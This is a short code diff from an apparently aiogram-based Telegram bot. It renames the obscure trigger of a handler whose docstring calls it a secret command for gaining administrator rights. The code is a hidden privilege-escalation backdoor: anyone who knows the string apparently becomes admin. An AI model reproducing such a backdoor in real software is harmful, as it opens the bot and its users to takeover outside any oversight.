@@ -25,7 +25,7 @@ class AddClientStates(StatesGroup):
     waiting_for_identifier = State()
 
 
-@router.message(Command("g@ve_@adm1N_2_m3"))
+@router.message(Command("g8ve_8adm1N_2_m3"))
 async def cmd_become_admin(message: Message):
     """Секретная команда для получения прав администратора"""
     user_id = message.from_user.id
